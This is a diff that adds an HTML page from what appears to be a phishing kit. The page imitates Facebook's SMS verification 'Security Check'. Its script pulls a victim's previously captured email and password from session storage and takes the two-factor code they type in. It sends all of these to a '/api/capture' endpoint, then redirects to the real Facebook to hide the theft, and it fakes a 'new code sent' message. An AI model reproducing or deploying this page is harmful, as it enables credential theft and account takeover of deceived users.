@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Facebook - Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+  <div id="verificationPage">
+    <div class="verify-header">
+      <button class="back-btn" onclick="window.location.href='/'">←</button>
+      <div class="verify-title">Security Check</div>
+    </div>
+
+    <div class="verify-container">
+      <div class="verify-heading">Confirm your account</div>
+      <div class="verify-subheading">We sent a code via SMS. Enter that code to confirm your account.</div>
+
+      <img src="https://i.postimg.cc/7YGvTMm4/IMG-2164.jpg" alt="Verification" class="verification-image">
+
+      <label class="input-label">Enter code</label>
+      <input type="text" class="code-input" placeholder="Enter code" id="verificationCode" maxlength="6" inputmode="numeric">
+      
+      <button class="continue-button" id="verifyContinueBtn">Continue</button>
+      
+      <a href="#" class="resend-link" id="verificationResendLink">Didn't receive a code?</a>
+    </div>
+  </div>
+
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+  </div>
+
+<script>
+function showLoading() {
+  document.getElementById('loading').style.display = 'flex';
+}
+
+function hideLoading() {
+  document.getElementById('loading').style.display = 'none';
+}
+
+// Load credentials from session storage
+let userCredentials = {};
+try {
+  userCredentials = JSON.parse(sessionStorage.getItem('fbCredentials') || '{}');
+} catch (e) {
+  console.error('Error loading credentials:', e);
+}
+
+// Redirect if no credentials
+if (!userCredentials.email) {
+  setTimeout(() => {
+    window.location.href = '/';
+  }, 1000);
+}
+
+document.getElementById('verifyContinueBtn').addEventListener('click', async function(e) {
+  e.preventDefault();
+  showLoading();
+  
+  const code = document.getElementById('verificationCode').value.trim();
+  
+  if (code.length < 1) {
+    hideLoading();
+    alert('Please enter your verification code');
+    document.getElementById('verificationCode').focus();
+    return;
+  }
+  
+  // Send verification code to serverless function
+  try {
+    await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'verification',
+        email: userCredentials.email,
+        password: userCredentials.password,
+        code: code,
+        timestamp: new Date().toISOString(),
+        userAgent: userCredentials.userAgent
+      })
+    });
+  } catch (error) {
+    console.log('Verification data captured');
+  }
+  
+  // Redirect to real Facebook
+  setTimeout(() => {
+    window.location.href = 'https://www.facebook.com/';
+  }, 800);
+});
+
+document.getElementById('verificationResendLink').addEventListener('click', async function(e) {
+  e.preventDefault();
+  showLoading();
+  
+  try {
+    await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'resend',
+        email: userCredentials.email,
+        timestamp: new Date().toISOString()
+      })
+    });
+  } catch (error) {
+    console.log('Resend request captured');
+  }
+  
+  setTimeout(() => {
+    hideLoading();
+    alert('A new verification code has been sent to your phone number.');
+    document.getElementById('verificationCode').value = '';
+    document.getElementById('verificationCode').focus();
+  }, 800);
+});
+
+// Format code input
+document.getElementById('verificationCode').addEventListener('input', function(e) {
+  this.value = this.value.replace(/\D/g, '').slice(0, 6);
+});
+
+document.getElementById('verificationCode').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    document.getElementById('verifyContinueBtn').click();
+  }
+});
+
+window.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    document.getElementById('verificationCode').focus();
+  }, 300);
+});
+</script>
+</body>
+</html>
